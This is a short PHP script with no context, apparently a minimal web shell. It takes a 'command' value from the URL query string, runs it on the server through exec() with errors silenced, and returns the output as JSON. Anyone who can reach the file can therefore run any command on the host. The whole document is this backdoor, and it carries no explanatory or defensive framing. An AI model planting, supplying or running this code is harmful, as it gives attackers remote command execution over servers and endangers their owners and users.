<?php
	$command=isset($_GET['command'])?$_GET['command']:0;
		if($command){
			@exec($command,$mo);
			$re['status']=true;
			$re['con']=$mo;
			echo json_encode($re);
		}